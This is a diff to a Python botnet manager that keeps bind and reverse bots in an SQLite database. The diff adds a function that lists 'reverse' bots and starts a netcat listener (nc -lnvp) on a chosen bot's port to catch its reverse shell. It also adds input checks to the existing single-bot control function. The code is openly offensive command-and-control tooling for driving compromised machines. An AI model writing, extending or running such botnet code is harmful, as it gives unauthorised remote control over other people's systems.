@@ -4,12 +4,12 @@ from os import system
 import socket
 import threading
 import time
+import os
 
-
-def listbot():
+def listbot(tabl):
     cprint("List of all the bots: ", attrs=["bold"])
     conn=sqlite3.connect('bnmanager.sqlite')
-    cursor=conn.execute("SELECT ID, Pay_name, host, port FROM bind")
+    cursor=conn.execute("SELECT ID, Pay_name, host, port FROM "+tabl)
     
     print("{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format("ID", "Name", "Host", "Port", id_width=2, name_width=10, host_width=15, port_width=6))
     print("-" * (2 + 10 + 15 + 6)) 
@@ -18,7 +18,38 @@ def listbot():
         print("{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format(*bot, id_width=2, name_width=10, host_width=15, port_width=6))
 
 
-
+def rev():
+    try:
+        listbot("reverse")
+        cprint("\nEnter Bot index of which you want to spawn reverse shell of\n",attrs=["bold"])
+        cprint("reverse> ", "green" ,attrs=["bold"], end="")
+        
+        user_input=input()
+        if not user_input.isdigit():
+            cprint("Invalid input. Please enter a valid bot index.", "yellow")
+            return 1
+        conn=sqlite3.connect('bnmanager.sqlite')
+        query="SELECT ID, host, port, pay_name FROM reverse WHERE ID="+str(user_input)
+        cursor=conn.execute(query)
+        lcursor=list(cursor)
+        
+        if len(lcursor) == 0:
+            cprint("Invalid Choice. Exiting...", "yellow")
+            return 1
+        
+        port = lcursor[0][2]
+        command = f"nc -lnvp {port}"
+        try:
+            os.system(command)
+        except KeyboardInterrupt:
+            cprint("\n[+] Ctrl+C detected. Exiting reverse shell...", "yellow", attrs=["bold"])
+            return 0
+        
+    except KeyboardInterrupt as e:
+        cprint("Exiting Bot operation mode...", "yellow")
+        return 1 
+    finally:
+        conn.close()
 
 def single():
     """
@@ -26,12 +57,15 @@ def single():
     
     """
     try:
-        listbot()
+        listbot("bind")
         cprint("\nEnter Bot index which you want to take control of\n",attrs=["bold"])
         cprint("single> ", "green" ,attrs=["bold"], end="")
         
         user_input=input()
-    
+        if not user_input.isdigit():
+            cprint("Invalid input. Please enter a valid bot index.", "yellow")
+            return 1
+        
         conn=sqlite3.connect('bnmanager.sqlite')
         query="SELECT ID, host, port, pay_name FROM bind WHERE ID="+str(user_input)
         cursor=conn.execute(query)
